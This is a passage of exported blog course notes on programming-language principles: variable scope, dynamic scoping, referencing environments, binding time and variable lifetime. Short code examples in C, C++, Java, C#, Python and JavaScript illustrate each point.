  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">y</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        System.out.println(y);  <span class="comment">// 1</span></span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println(y);  <span class="comment">// y is not visible</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><font color="3A75EA">Nested block</font></p>
<ul>
<li>Reusing name in nested blocks is only legal in <code>C</code> and <code>C++</code>  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> x = <span class="number">0</span>;</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> x = <span class="number">1</span>;</span><br><span class="line">        std::cout &lt;&lt; x &lt;&lt; std::endl; <span class="comment">// 1</span></span><br><span class="line">    &#125;</span><br><span class="line">    std::cout &lt;&lt; x &lt;&lt; std::endl; <span class="comment">// 0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">1</span>;  <span class="comment">// error - already defined</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h3 id="Declaration-Order"><a href="#Declaration-Order" class="headerlink" title="Declaration Order"></a>Declaration Order</h3><ul>
<li><p>Some old languages (<code>C89</code>) require variable declaration <font color="3A75EA">at the top</font> of the function</p>
<ul>
<li>In <code>C89</code> compiler, the variable should be declare before the loop  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">// int i;</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)&#123; <span class="comment">// error</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;hi &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><code>C99</code>, <code>C++</code>, <code>Java</code>, <code>C#</code> allow variable declarations appear <font color="3A75EA">anywhere</font></p>
<ul>
<li><p>In <code>C99</code>, <code>C++</code>, <code>Java</code>, the scope of all local variables is <font color="F54747">from the declaration to the end of the block</font></p>
  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// OK in Java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>But in <code>C#</code>, the scope of any variable declared in a block is the <font color="F54747">whole block</font></p>
  <figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Not ok in C#</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span> &#123;</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">int</span> x = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">int</span> x = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h3 id="Global-Scope"><a href="#Global-Scope" class="headerlink" title="Global Scope"></a>Global Scope</h3><ul>
<li>The scope in which variables and functions are visible to the entire program (including in other files)  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// File 1</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> i = <span class="number">99</span>;  <span class="comment">// CAN define it again in other file</span></span><br><span class="line"><span class="type">int</span> g = <span class="number">100</span>;    <span class="comment">// CANNOT define it again in other file</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> j;   <span class="comment">// extern needed, if you want to declare a variable from other file</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    std::cout &lt;&lt; i &lt;&lt; std::endl;    <span class="comment">// 99</span></span><br><span class="line">    std::cout &lt;&lt; j &lt;&lt; std::endl;    <span class="comment">// 777</span></span><br><span class="line">    std::cout &lt;&lt; g &lt;&lt; std::endl;    <span class="comment">// 100</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// File 2</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> i = <span class="number">1234</span>;</span><br><span class="line"><span class="type">int</span> j = <span class="number">777</span>;</span><br><span class="line"><span class="type">int</span> g = <span class="number">0</span>;  <span class="comment">// illegal</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    std::cout &lt;&lt; i &lt;&lt; std::endl;    <span class="comment">// 1234</span></span><br><span class="line">    std::cout &lt;&lt; j &lt;&lt; std::endl;    <span class="comment">// 777</span></span><br><span class="line">    std::cout &lt;&lt; g &lt;&lt; std::endl;    <span class="comment">// Compilation error: &#x27;g&#x27; has already been defined</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="Python-Scope"><a href="#Python-Scope" class="headerlink" title="Python Scope"></a>Python Scope</h3><ul>
<li><p>Global variable</p>
<ul>
<li>It can be referenced in <font color="3A75EA">all functions</font></li>
<li>It can be assigned if it has been declared to be global using the keyword <code>global</code> in the function  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">g = <span class="string">&quot;global&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">    <span class="keyword">global</span> g</span><br><span class="line">    g = <span class="string">&quot;local&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;from f(), &quot;</span>, g)  <span class="comment"># local</span></span><br><span class="line">f()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;from glocal, &quot;</span>, g)   <span class="comment"># local</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>Nonlocal variable</p>
<ul>
<li>It can be referenced in the <font color="3A75EA">inner functions</font></li>
<li>It can be assigned if it has been declared to be nonlocal using the keyword <code>nonlocal</code> in the function</li>
<li><font color="F54747">NOTED: The <code>nonlocal</code> only refers to the nearest static ancestors</font></li>
<li><font color="F54747">NOTED: The <code>nonlocal</code> only works for nonlocal variables, which means it cannot refer to a global variable</font>  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">sub1</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;sub1&quot;</span>)</span><br><span class="line">    x = <span class="string">&quot;modified at sub1&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sub2</span>():</span><br><span class="line">        <span class="comment"># nonlocal x</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;sub2&quot;</span>)</span><br><span class="line">        x = <span class="string">&quot;modified at sub2&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">sub3</span>():</span><br><span class="line">            <span class="keyword">nonlocal</span> x  <span class="comment"># goes into the static parent (sub2)</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;sub3&quot;</span>)</span><br><span class="line">            x = <span class="string">&quot;modified at sub3&quot;</span></span><br><span class="line"></span><br><span class="line">        sub3()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;x from sub2:&quot;</span>, x)   <span class="comment"># x from sub2: modified at sub3</span></span><br><span class="line"></span><br><span class="line">    sub2()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;x from sub1:&quot;</span>, x)   <span class="comment"># x from sub1: modified at sub1</span></span><br><span class="line"></span><br><span class="line">sub1()</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h2 id="Dynamic-Scope"><a href="#Dynamic-Scope" class="headerlink" title="Dynamic Scope"></a>Dynamic Scope</h2><ul>
<li><p>The scope of a variable is determined by the order of function calls at runtime rather than by the static structure of the program</p>
<ul>
<li>Temporal</li>
<li>Can only be determined at runtime  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">big</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> x = <span class="string">&quot;hehe&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">sub1</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> x = <span class="string">&quot;haha&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">sub2</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title function_">sub1</span>()</span><br><span class="line">        <span class="keyword">var</span> y = x</span><br><span class="line">        <span class="keyword">var</span> z = <span class="string">&quot;hoho&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">sub2</span>()</span><br><span class="line">    <span class="title function_">print</span>(x)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">big</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// static scoping: hehe</span></span><br><span class="line"><span class="comment">// dynamic scoping: haha</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>Evaluation</strong>:</p>
<ul>
<li><font color="F54747"><strong>Advantages</strong></font>:<ol>
<li>Convenience<ul>
<li>Variables from the caller are <font color="3A75EA">implicitly</font> visible in the callee</li>
</ul>
</li>
</ol>
</li>
<li><font color="F54747"><strong>Disadvantages</strong></font>:<ol>
<li>Reliability<ul>
<li>The variables are visibile to all subprograms it calls</li>
<li>Impossible to statically type check</li>
</ul>
</li>
<li>Hard to understand<ul>
<li>the variable value can be different every time</li>
</ul>
</li>
<li>Costly runtime</li>
</ol>
</li>
</ul>
</li>
</ul>
<h2 id="Referencing-Environments"><a href="#Referencing-Environments" class="headerlink" title="Referencing Environments"></a>Referencing Environments</h2><ul>
<li><p>A data structure that stores all variable names that are visible at the statement</p>
</li>
<li><p>Static-scoped language:</p>
<ul>
<li>local variables + all visible variables in all <font color="F54747">enclosing scopes</font></li>
</ul>
</li>
<li><p>Dynamic-scoped language</p>
<ul>
<li>local variables + all visible variables in all <font color="F54747">active subprograms</font> in calling sequence</li>
<li><font color="F54747">active subprograms&lt;</font>: the execution has begun but not yet terminated</li>
</ul>
</li>
<li><p>Practice 1: Python Scoping</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">g = <span class="string">&quot;global doge&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub1</span>():</span><br><span class="line">    h = <span class="string">&quot;husky&quot;</span> </span><br><span class="line">    <span class="comment"># Point (1)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sub2</span>():</span><br><span class="line">        <span class="keyword">global</span> g</span><br><span class="line">        c = <span class="string">&quot;corgi&quot;</span></span><br><span class="line">        <span class="comment"># Point (2)</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">sub3</span>():</span><br><span class="line">            <span class="keyword">nonlocal</span> c</span><br><span class="line">            g = <span class="string">&quot;meow&quot;</span></span><br><span class="line">            <span class="comment"># Point (3)</span></span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th align="center">Point</th>
<th align="center">Referencing Environment</th>
</tr>
</thead>
<tbody><tr>
<td align="center">(1)</td>
<td align="center"><font color="3A75EA">local h</font> (reference &amp; assignment), <font color="3A75EA">global g</font> (reference only)</td>
</tr>
<tr>
<td align="center">(2)</td>
<td align="center"><font color="3A75EA">local c</font> (reference &amp; assignment), <font color="3A75EA">global g</font> (reference and assignment), <font color="3A75EA">nonlocal h</font> (reference only)</td>
</tr>
<tr>
<td align="center">(3)</td>
<td align="center"><font color="3A75EA">local g</font> (reference &amp; assignment), <font color="3A75EA">nonlocal c</font> (reference and assignment), <font color="3A75EA">nonlocal h</font> (reference only)</td>
</tr>
</tbody></table>
</li>
<li><p>Practice 2: Dynamic Scoping</p>
  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">sub1</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> a, b</span><br><span class="line">    <span class="comment">//Point (1)</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sub2</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> b, c</span><br><span class="line">    <span class="comment">//Point (2)</span></span><br><span class="line">    <span class="title function_">sub1</span>()</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123; <span class="comment">//suppose main() is the program entry point</span></span><br><span class="line">    <span class="keyword">var</span> c, d</span><br><span class="line">    <span class="comment">//Point (3)</span></span><br><span class="line">    <span class="title function_">sub2</span>()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th align="center">Point</th>
<th align="center">Referencing Environment</th>
</tr>
</thead>
<tbody><tr>
<td align="center">(1)</td>
<td align="center">a and b (sub1), c (sub2), d (main)</td>
</tr>
<tr>
<td align="center">(2)</td>
<td align="center">b and c (sub2), d (main)</td>
</tr>
<tr>
<td align="center">(3)</td>
<td align="center">c and d (main)</td>
</tr>
</tbody></table>
</li>
</ul>
<h2 id="Named-Constants"><a href="#Named-Constants" class="headerlink" title="Named Constants"></a>Named Constants</h2><ul>
<li><p>A variable that is bound to a value only <font color="F54747">once</font></p>
</li>
<li><p>The binding of values can be <font color="3A75EA">either static or dynamic</font></p>
</li>
<li><p><font color="F54747"><strong>Advantages</strong></font></p>
<ol>
<li>Readibility</li>
<li>Reliability</li>
<li>Possibility to parameterize a program</li>
</ol>
</li>
<li><p>Syntax:</p>
<ul>
<li><p><code>Java</code></p>
<ul>
<li><code>final</code>: dynamically bound</li>
</ul>
</li>
<li><p><code>C++</code></p>
<ol>
<li><code>const</code>: dynamically bound</li>
<li><code>constexp</code>: statically bound, must be evaluated at compile time</li>
</ol>
</li>
<li><p><code>C#</code></p>
<ol>
<li><code>readonly</code>: dynamically bound</li>
<li><code>const</code>: statically bound, must be evaluated at compile time</li>
</ol>
</li>
</ul>
</li>
</ul>
<h2 id="Scope-amp-Lifetime"><a href="#Scope-amp-Lifetime" class="headerlink" title="Scope &amp; Lifetime"></a>Scope &amp; Lifetime</h2><ul>
<li>Scope and lifetime are often closely related, but are different concepts</li>
<li>Example:  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">f</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> x;   <span class="comment">// static storage</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ha &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    f();</span><br><span class="line">    x = <span class="number">0</span>;  <span class="comment">// cannot be accessed</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>Lifetime: <code>x</code> is static storage because of the keyword <code>static</code>, because all static storage variables are already existed in the data region</li>
<li>Scope: <code>x</code> cannot be accessed in the main function because of its scope, which is not related to the static storage</li>
</ul>
</li>
</ul>
<!-- 
<font color="3A75EA">Blue</font>
<font color="F54747">Red</font>
-->
]]></content>
      <categories>
        <category>CSCI3180</category>
      </categories>
      <tags>
        <tag>Principles</tag>
      </tags>
  </entry>
  <entry>
    <title>Variables</title>
    <url>/myBlog/2023/02/08/2023/CSCI3180/2023-2-8-CSCI3180-Abstraction/</url>
    <content><![CDATA[<h2 id="Names-Design-Issues"><a href="#Names-Design-Issues" class="headerlink" title="Names Design Issues"></a>Names Design Issues</h2><ol>
<li><p>Length</p>
<ul>
<li>Too short cannot be connotative</li>
</ul>
</li>
<li><p>Special characters</p>
<ul>
<li><code>PHP</code>: all variables names must begin with <code>$</code></li>
<li><code>Perl</code>: all veriables names begin with special characters (<code>$</code>, <code>@</code>, <code>%</code>) that specify the variable’s type</li>
</ul>
</li>
<li><p>Case sensitivity</p>
<ul>
<li><code>C</code>, <code>C++</code>, <code>Java</code>, <code>C#</code>, <code>Perl</code>, <code>Python</code>, <code>Ruby</code>, <code>Swift</code>: sensitivity</li>
<li><code>VBA</code>, <code>Pascal</code>, <code>COBOL</code>: not sensitivity</li>
<li><code>Prolog</code>, <code>Haskell</code>, <code>Go</code>: the cases carry semantics</li>
<li><code>PHP</code>: variable names are sensitivity but function names are not</li>
<li>metrics:<ul>
<li><code>doge</code> - variable</li>
<li><code>Doge</code> - class</li>
<li><code>DOGE</code> - constant</li>
</ul>
</li>
</ul>
</li>
<li><p>Special words</p>
<ul>
<li>increase the readability</li>
<li>most of them are <font color="F54747">reserved words (keywords)</font> that cannot be redefined</li>
<li><code>Fortran</code> can be redefined, it is unreadable for some cases  <figure class="highlight fortran"><table><tr><td class="code"><pre><span class="line"><span class="comment">! unreadable example</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">if</span> .eq. <span class="keyword">then</span> <span class="keyword">then</span> <span class="keyword">if</span> = <span class="keyword">else</span> <span class="keyword">else</span> <span class="keyword">then</span> = <span class="keyword">if</span> <span class="keyword">endif</span></span><br><span class="line"></span><br><span class="line"><span class="comment">! the actural meaning</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">if</span> == <span class="keyword">then</span>) <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">if</span> = <span class="keyword">else</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">then</span> = <span class="keyword">if</span></span><br><span class="line"><span class="keyword">end</span> <span class="keyword">if</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h2 id="Address"><a href="#Address" class="headerlink" title="Address"></a>Address</h2><ul>
<li><p>the <font color="F54747">memory address</font> with which it is associated</p>
</li>
<li><p>a variable can have no name</p>
  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span>* p = <span class="keyword">new</span> <span class="type">int</span>;   <span class="comment">// the variable has no name but a pointer points to it</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Address of the nameless variable is &quot;</span> &lt;&lt; p &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Address of the pointer p is &quot;</span> &lt;&lt; &amp;p &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
<li><p>a variable may have different addresses at different times during execution</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">f</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> c;  <span class="comment">// local variable</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    f();</span><br><span class="line">    <span class="type">int</span> x = <span class="number">0</span>;</span><br><span class="line">    f(); <span class="comment">// the local variable may have a different address when the function is called</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">10</span>; i++)&#123;</span><br><span class="line">        <span class="type">int</span> d; <span class="comment">// the variable in the body of a loop is recreated in every iteraction</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="Value"><a href="#Value" class="headerlink" title="Value"></a>Value</h2><ul>
<li>the <font color="F54747">contents</font> of the location with which the variable is associated<ul>
<li><code>a = 5</code></li>
<li><font color="F54747">l-value</font> (<font color="3A75EA">left value</font>): the address of the variable</li>
<li><font color="F54747">r-value</font> (<font color="3A75EA">right value</font>): the value of the variable</li>
</ul>
</li>
</ul>
<h2 id="Type"><a href="#Type" class="headerlink" title="Type"></a>Type</h2><ul>
<li>the <font color="F54747">range of value</font> of variavle and the <font color="F54747">set of operations</font> that are defined for values of that type<ul>
<li>e.g. <font color="F54747">range of value</font>: range of <code>int</code> is between [-32768, 32767]</li>
</ul>
</li>
</ul>
<h2 id="Binding"><a href="#Binding" class="headerlink" title="Binding"></a>Binding</h2><ul>
<li>an <font color="F54747">association</font> between an <font color="3A75EA">entity</font>(實體) and an <font color="3A75EA">attribute</font>(屬性)<ul>
<li>e.g. between a <font color="3A75EA">variable</font> and its <font color="3A75EA">type or value</font></li>
<li>e.g. between an <font color="3A75EA">operation</font> and a <font color="3A75EA">symbol</font></li>
</ul>
</li>
</ul>
<h3 id="Binding-Time"><a href="#Binding-Time" class="headerlink" title="Binding Time"></a>Binding Time</h3><ul>
<li><p>the time at which a binding takes place</p>
</li>
<li><p>Possible binding time:</p>
<ol>
<li><p>Language design time</p>
<ul>
<li>bind operator symbols to operations</li>
</ul>
</li>
<li><p>Language implementation time</p>
<ul>
<li>bind floating point type to a representation</li>
</ul>
</li>
<li><p>Complie time</p>
<ul>
<li>bind a variable to a type in <code>C</code> or <code>Java</code></li>
</ul>
</li>
<li><p>Load time</p>
<ul>
<li>bind a <code>C</code> or <code>C++</code> static variable to a memory cell</li>
</ul>
</li>
<li><p>Runtime</p>
<ul>
<li>bind a nonstatic local variable to a memory cell</li>
</ul>
</li>
</ol>
</li>
<li><p><font color="F54747"><strong>Noted</strong>:</font> </p>
<ul>
<li><code>1 - 4</code> is <font color="F54747">static</font>, which binds <font color="F54747">before</font> the runtime</li>
<li><code>5</code> is <font color="F54747">dynamic</font>, which binds <font color="F54747">at</font> the runtime</li>
<li>We prefer that do the binding before runtime, because it is more efficiency.</li>
</ul>
</li>
</ul>
<h3 id="Static-Binding"><a href="#Static-Binding" class="headerlink" title="Static Binding"></a>Static Binding</h3><ul>
<li><p>it first occurs <font color="F54747">before run time</font> and <font color="F54747">remains unchanged (the memory location) throughout program execution</font></p>
</li>
<li><p><font color="F54747">explicit declaration</font>顯性: program statement for <font color="3A75EA">declaration</font> (with types of variable)</p>
  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">999</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;Hello World&quot;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><font color="F54747">implicit declaration</font>隱性: <font color="3A75EA">default</font> mechanism for specifying types of variables (<code>Fortran</code>)</p>
  <figure class="highlight fortran"><table><tr><td class="code"><pre><span class="line"><span class="comment">! i, j, k are assumed to be integers</span></span><br><span class="line"><span class="comment">! r, s, t are assumed to be reals</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="Dynamic-Binding"><a href="#Dynamic-Binding" class="headerlink" title="Dynamic Binding"></a>Dynamic Binding</h3><ul>
<li><p>it first occurs <font color="F54747">during execution</font> or can <font color="F54747">change during execution of the program</font> (<code>JavaScript</code>, <code>Python</code>, <code>PHP</code>)</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">list</span> = [<span class="number">2</span>, <span class="number">4.33</span>, <span class="number">6</span>, <span class="number">8</span>]</span><br><span class="line"><span class="built_in">list</span> = <span class="number">17.3</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>Evaluation</strong>:</p>
<ul>
<li><font color="F54747"><strong>Advantages</strong></font>:<ol>
<li>flexibility (code generic)</li>
</ol>
</li>
<li><font color="F54747"><strong>Disadvantages</strong></font>:<ol>
<li>high cost</li>
<li>type error detection by compoler is difficult</li>
</ol>
</li>
</ul>
</li>
</ul>
<h2 id="Lifetime"><a href="#Lifetime" class="headerlink" title="Lifetime"></a>Lifetime</h2><ul>
<li><p>Storage Binding</p>
<ol>
<li><p><font color="F54747">Allocation</font>: </p>
<ul>
<li>getting an memory cell from some pool (stack&#x2F;heap) of available cells</li>
</ul>
</li>
<li><p><font color="F54747">Deallocation</font>: </p>
<ul>
<li>putting a cell back to the pool</li>
</ul>
</li>
</ol>
</li>
<li><p>Lifetime is the time period when it is bound to a particular memory cell (from allocated to deallocated).</p>
</li>
</ul>
<h3 id="Static-Variables"><a href="#Static-Variables" class="headerlink" title="Static Variables"></a>Static Variables</h3><ul>
<li><p>Bound to memory cells <font color="F54747">before execution begins</font> and remains bound to the <font color="3A75EA">same</font> memory cell <font color="F54747">throughout execution</font></p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> x = <span class="number">0</span>;  <span class="comment">// global variable (static)</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> y = <span class="number">50</span>;  <span class="comment">// global variable (this static doesn&#x27;t mean static variable)</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> z = <span class="number">100</span>;    <span class="comment">// local variable</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>Evaluation</strong>:</p>
<ul>
<li><p><font color="F54747"><strong>Advantages</strong></font>:</p>
<ol>
<li>Efficiency (direct addressing)</li>
<li>History-sensitive subprogram support</li>
</ol>
</li>
<li><p><font color="F54747"><strong>Disadvantages</strong></font>:</p>
<ol>
<li>Lack of flexibility (cannot use for recursion)</li>
<li>No sharing of storage</li>
</ol>
</li>
</ul>
</li>
</ul>
<h3 id="Stack-Dynamic-Variables"><a href="#Stack-Dynamic-Variables" class="headerlink" title="Stack-Dynamic Variables"></a>Stack-Dynamic Variables</h3><ul>
<li><p>Bound to stack memory cells <font color="F54747">when the function is called</font> and remains bound to the <font color="3A75EA">same</font> memory cell <font color="F54747">until the function is returned</font></p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">f</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> x = <span class="number">999</span>;    <span class="comment">// stack-dynamic variable</span></span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    f();</span><br><span class="line">    f();    <span class="comment">// has the same address (the memory cells for pervious function was removed)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>Evaluation</strong>:</p>
<ul>
<li><p><font color="F54747"><strong>Advantages</strong></font>:</p>
<ol>
<li>Can use for recursion</li>
<li>Conversation of storage</li>
</ol>
</li>
<li><p><font color="F54747"><strong>Disadvantages</strong></font>:</p>
<ol>
<li>Overhead of allocation and deallocation</li>
<li>Inefficient references (indirect addressing)</li>
</ol>
</li>
</ul>
</li>
</ul>
<h3 id="Explicit-Heap-Dynamic-Variables"><a href="#Explicit-Heap-Dynamic-Variables" class="headerlink" title="Explicit Heap-Dynamic Variables"></a>Explicit Heap-Dynamic Variables</h3><ul>
<li><p>Allocated and deallocated by <font color="F54747">explicit directives</font>, <font color="3A75EA">specified by the programmer</font>, which can take effect <font color="F54747">during execution</font></p>
</li>
<li><p><font color="F54747">Nameless</font>: can only access by pointers or references</p>
  <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// *</span></span><br><span class="line">    <span class="type">int</span>* p = <span class="keyword">new</span> <span class="built_in">int</span>(<span class="number">88</span>);   <span class="comment">// one single integer</span></span><br><span class="line">    <span class="type">int</span>* a = <span class="keyword">new</span> <span class="type">int</span>[size]; <span class="comment">// an array of size integers</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// **</span></span><br><span class="line">    <span class="type">int</span>** pp = &amp;p;  <span class="comment">// pp -&gt; p -&gt; int(88)</span></span><br><span class="line">    Ingredient** ingredientStorage = <span class="keyword">new</span> Ingredient*[size]; <span class="comment">// Assignment 1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
<li><p><strong>Evaluation</strong>:</p>
<ul>
<li><p><font color="F54747"><strong>Advantages</strong></font>:</p>
<ol>
